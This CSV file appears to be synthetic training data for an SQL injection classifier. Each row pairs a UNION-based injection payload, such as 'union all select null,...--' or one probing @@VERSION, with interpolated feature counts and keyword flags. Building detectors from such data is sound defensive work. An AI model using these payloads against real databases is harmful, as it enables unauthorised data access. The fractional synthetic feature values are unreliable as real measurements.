id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000148,attack,union," select * from users where id  =  1 or 1#""; union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000037,10.401393336864622,81.0,27.0,3.8852146856306904,42.0,4.0,25.0,10.0,0.5185185185185185,0.04938271604938271,0.30864197530864196,0.12345679012345678,0.0,1.0,2.0,0.0,1.0,1.0,0.5842788475668071,2.0,0.0,0.0,1.0,4.0,0.0,1.0,1.0,1.0,0.0,1.0,1.0,0.5842788475668071,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000149,attack,union,"-5702'   )    )     )   union all select 7806,7806,7806,7806,7806--",nearest_attack_euclidean,R000283,0.7399853566763603,64.65733056170059,20.46853388765988,3.7394453144651814,13.999999999999998,24.0,16.12586444936047,10.531466112340118,0.21685059512185645,0.37174387735175396,0.248579915261565,0.16282561226482462,1.0,0.0,3.0,0.0,0.0,0.0,0.0,2.531466112340118,0.0,0.0,4.0,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000150,attack,union,"1   )    )     )   union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000255,0.5281833217167922,75.30091745245342,15.0,3.080362864104914,46.0,1.0,16.64073396196273,11.660183490490683,0.6115003241679551,0.013293485307999037,0.22040404057124258,0.15480214995280334,0.0,0.0,2.0,0.0,0.0,0.0,0.0,2.6601834904906827,0.0,0.0,7.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000151,attack,union,"1"" union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000311,0.08352173251187875,56.03172925018096,15.03172925018096,3.139544878469684,42.0,1.0,4.0,9.03172925018096,0.74958250986604,0.017847202615858093,0.07138881046343239,0.16118147705466954,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.03172925018096043,0.0,6.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000152,attack,union," select * from users where id  =  1 +$+. union select null,@@VERSION -- 1",nearest_attack_euclidean,R000036,0.07254678720150937,73.05769450713468,32.0,4.409765543542465,44.0,2.0,16.028847253567346,11.028847253567344,0.6022760624084152,0.027376184654928,0.21939410728698833,0.1509536456496684,0.0,0.0,2.0,0.0,1.0288472535673445,1.0,0.0,0.0,0.0,0.0,1.0,6.028847253567345,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000153,attack,union,"1"" where 4684  =  4684 union all select null,null,null,null#",nearest_attack_euclidean,R000210,0.763746156793269,59.564811531958206,22.217594234020897,3.867477994834602,33.69443459587461,9.0,11.305565404125385,5.564811531958204,0.5652004804982586,0.15112548741734946,0.1904269565884888,0.09324707549590319,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.2175942340208975,0.0,0.0,2.3472172979373074,1.0,0.0,1.0,0.0,1.0,0.0,1.0,0.2175942340208975,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000154,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000286,1.2993123838413894,73.89645432662918,20.0,3.7270005509824373,13.999999999999998,33.517163461303355,14.0,12.379290865325839,0.19138144146836394,0.45004536417213453,0.19138144146836392,0.16719175289113763,0.0,1.0,3.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,6.379290865325838,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000155,attack,union,1'  )   as zmvn where 2887  =  2887 union all select null--,nearest_attack_euclidean,R000257,0.6365192584498452,61.115539324820496,24.39556019290843,3.9156063835720873,29.0,9.0,17.81331942127471,5.302219903545785,0.4757702515614293,0.14765283669147805,0.2899684685819414,0.08660844316515122,1.0,0.0,2.0,0.0,0.0,1.0,0.0,1.3022199035457849,0.0,0.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000156,attack,union,"1%""   )    )     )   union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000212,0.35528331080455633,79.0,17.0,3.1881014937004313,46.96319547031311,1.0,17.03680452968689,14.0,0.5944708287381406,0.01265822784810125,0.2156557535403404,0.17721518987341772,0.0,1.0,2.0,0.0,0.0,0.0,0.0,2.7592011324217225,1.0,0.0,7.2407988675782775,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000157,attack,union,"1""  )   where 2633  =  2633 union all select null,null,null,null#",nearest_attack_euclidean,R000126,0.5277360630854001,65.0,22.803257433979446,3.8150143014489455,35.78697026408222,9.0,13.21302973591778,7.0,0.5505687732935726,0.13846153846153847,0.20327738055258124,0.1076923076923077,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.8032574339794449,0.0,0.0,3.1967425660205553,1.0,0.0,1.0,0.0,1.0,0.0,1.0,0.803257433979445,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000158,attack,union,"-7337"" union all select 7294,7294,7294,7294,7294,7294,7294,7294,7294,7294--",nearest_attack_euclidean,R000136,0.538113693496418,75.99667531221802,19.199335062443602,3.6369012344316616,13.999999999999998,44.0,4.797340249774411,13.199335062443602,0.18434109093815795,0.5793577143770678,0.06263563624736813,0.173665558437406,0.0,1.0,3.0,0.0,0.0,0.0,0.0,0.19933506244360277,0.0,0.0,9.0,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.19933506244360272,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000159,attack,union,"1   )    )    as xvyi where 6701  =  6701 union all select null,null,null,null#",nearest_attack_euclidean,R000205,0.767524815427615,76.03626037123158,23.814504148492627,3.7922738157461287,40.407252074246315,9.0,19.629008296985255,7.0,0.5326887247560015,0.11881740169857197,0.2560803388909816,0.09241353465444488,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.7036260371231573,0.0,0.0,3.296373962876843,1.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000160,attack,union,"1""   )    )     )   union all select null,null,null,null--",nearest_attack_euclidean,R000177,0.1658511859483133,58.85258401899513,16.0,3.204976400662705,30.682067215196103,1.0,18.0,9.170516803799027,0.5207866069755376,0.017025206891735506,0.3064537240512393,0.15573446208148767,0.0,1.0,2.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,3.1705168037990257,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000161,attack,union,"-7744""   )    )     )   union all select 9408,9408,9408,9408--",nearest_attack_euclidean,R000125,0.8036998137942798,63.637293581864725,20.54576452728824,3.736874012602743,13.999999999999998,21.091529054576483,18.0,10.545764527288242,0.2203695184662936,0.33086549567040974,0.2833322380280918,0.16543274783520487,0.0,1.0,3.0,0.0,0.0,0.0,0.0,3.0,0.2728822636441207,0.0,3.272882263644121,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000162,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000249,0.4374918081247639,67.73181468652373,23.51954440595712,3.8532514694405844,35.34636293730475,9.0,15.385451749218987,8.0,0.5227764034756345,0.13325631336150046,0.22551722684153128,0.11845005632133376,1.0,0.0,2.0,0.0,0.0,1.0,0.0,1.1731814686523734,0.0,0.0,2.8268185313476266,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000163,attack,union,"1%'   )    )    union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000299,0.13581506910103788,74.18505451602167,16.953736370994584,3.2134511409422943,46.0,1.0,14.18505451602166,13.0,0.6201468281813936,0.013481452786552023,0.191112832806878,0.17525888622517644,1.0,0.0,2.0,0.0,0.0,0.0,0.0,2.0462636290054155,0.9537363709945847,0.0,7.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000164,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000286,0.3512917548370486,66.15698808700961,20.0,3.761080804148485,13.999999999999998,26.65118093921537,14.674409530392314,10.83139761740192,0.21179638102596668,0.4018376159102457,0.22267395409681046,0.16369204896697714,0.0,1.0,3.0,0.0,0.0,0.0,0.0,2.1686023825980785,0.0,0.0,4.662795234803843,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000165,attack,union,"-8699""  )   union all select 8645,8645,8645,8645,8645,8645--",nearest_attack_euclidean,R000268,0.4599496632994282,60.46774421141206,20.23387210570603,3.872031598860494,13.999999999999998,27.064511577175878,9.40323263423618,10.0,0.23157300565597613,0.44805748836317616,0.1549602162265791,0.16540928975426866,0.0,1.0,3.0,0.0,0.0,0.0,0.0,1.2338721057060298,0.0,0.0,4.76612789429397,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000166,attack,union,"1'  )   where 8211  =  8211 union all select null,null,null,null,null#",nearest_attack_euclidean,R000068,0.9419974321762402,74.90781782538383,22.490781782538384,3.707012068867514,42.92625426030707,9.0,14.0,8.981563565076767,0.5720415898270581,0.12068386420920454,0.1877304554365404,0.11954409052719697,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,4.981563565076767,1.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000167,attack,union,"1   )    )     )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000103,0.5374924710450211,67.17077142450032,15.195128570750052,3.088154902009966,38.78051428300021,1.0,18.0,9.390257141500106,0.5772358225056823,0.014905140693497354,0.2682925324829533,0.13956650431786702,0.1951285707500529,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,5.195128570750053,0.0,0.19512857075005285,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000168,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000302,0.0979716457467001,71.56432130808152,23.14108032702038,3.8131836139765896,39.42324098106114,9.0,14.14108032702038,9.0,0.5507294666857125,0.12585507367218154,0.19756038596992434,0.12585507367218154,1.0,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,4.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000169,attack,union," select * from users where id  =  1 or \<\ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000024,0.03226923615294578,74.84079827353847,31.053067242153844,4.344077848805086,45.787731031384624,2.0530672421538423,17.0,10.0,0.611741316068718,0.02746267529897428,0.2271678572870085,0.13362815134529912,0.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000170,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000067,0.6495589846190113,65.24841883424277,21.248418834242766,3.877157163305548,13.999999999999998,32.0,8.0,11.248418834242765,0.21457392455025673,0.49045468468630105,0.12261367117157526,0.17235771959186696,1.0,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.24841883424276473,0.0,6.0,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000171,attack,union,"-3116""   )    )     )   union all select 4600,4600,4600,4600--",nearest_attack_euclidean,R000239,0.045644913445697544,62.0,20.0,3.653335432546536,13.999999999999998,20.0,18.0,10.0,0.22580645161290322,0.3225806451612903,0.2903225806451613,0.16129032258064516,0.0,1.0,3.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,3.0,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000172,attack,union,"-2787' union all select 3622,3622,3622,3622,3622,3622,3622,3622,3622,3622#",nearest_attack_euclidean,R000092,0.4171443211414541,71.85877864988777,19.785877864988777,3.4721411120854144,13.999999999999998,42.287022919910214,4.0,11.571755729977552,0.19551881311266286,0.5877224314776803,0.05586251803218939,0.16089623737746744,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.571755729977554,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000173,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000215,0.39307887048026824,69.07858988329752,16.0,3.143474181266983,43.662871906638024,1.0,14.0,10.415717976659506,0.6315393763609713,0.014522467555088653,0.20331454577124145,0.1506236103126985,1.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,6.415717976659506,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000174,attack,union,1'  )   as gogu where 4338  =  4338 union all select null#,nearest_attack_euclidean,R000142,0.008485062755272187,58.02287823190473,22.99673168115647,3.9072173915127615,29.0196099130612,9.0,15.993463362312934,4.009804956530599,0.5001257045709051,0.15511779732436537,0.27566440936436987,0.06909208874035963,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.009804956530598652,1.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000175,attack,union,"-1187'  )   union all select 8202,8202,8202,8202,8202,8202,8202#",nearest_attack_euclidean,R000173,0.10526591149865254,64.0,21.0,3.7381799740460075,13.999999999999998,32.0,8.0,10.0,0.21875,0.5,0.125,0.15625,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,6.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000176,attack,union,"1'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000077,1.2408833867736995,55.40892228728055,17.22676686184164,3.4058716476130964,38.40892228728055,1.0,9.22676686184164,6.773233138158361,0.6931661295077173,0.018049051205428407,0.16629896074774214,0.12248585853911217,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,3.7732331381583615,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000177,attack,union,"1%""   )    )    union all select null,null,null,null,null#",nearest_attack_euclidean,R000161,0.24771007022362143,57.93364842616662,17.3317578691669,3.3304629233542045,32.6729685233324,2.2606799028342195,14.0,9.0,0.563608024157173,0.03937864063466967,0.24166029099626962,0.15535304421188761,0.0,1.0,0.06635157383337975,0.0,0.0,0.0,0.0,2.0,1.0,0.0,3.93364842616662,0.06635157383337953,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000178,attack,union," select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000014,0.03202699061150731,73.0,32.14233575083044,4.376626527944057,42.0,3.0,17.0,11.0,0.5753424657534246,0.0410958904109589,0.2328767123287671,0.1506849315068493,0.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000179,attack,union,"-3378%""   )    )    union all select 9357,9357,9357,9357,9357--",nearest_attack_euclidean,R000240,0.6123762997983494,63.919793755593645,20.77005156110159,3.820997837780858,13.999999999999998,24.91979375559365,14.0,11.0,0.2191714966646977,0.3894508307197707,0.21917149666469768,0.1722061759508339,0.0,1.0,3.0,0.0,0.0,0.0,0.0,2.0,0.7700515611015881,0.0,4.229948438898412,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000180,attack,union,"1%""  )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000293,0.05430252266588663,60.985785240183255,16.97157048036651,3.2469758436202745,42.05685903926698,1.0,7.94314096073302,9.985785240183255,0.6896353610130025,0.016397326437108395,0.13023096084241753,0.16373635170747158,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.985785240183255,0.985785240183255,0.0,6.0142147598167455,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.985785240183255,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000181,attack,union,"1""  )   where 2633  =  2633 union all select null,null,null,null#",nearest_attack_euclidean,R000126,0.08349384905337401,64.77309271340272,23.0,3.8219113670903093,34.80550804005947,9.0,14.06483065331351,6.902754020029736,0.5372147951285864,0.13900322694413147,0.21734501179780907,0.10643696612947315,0.0,1.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,2.902754020029735,1.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
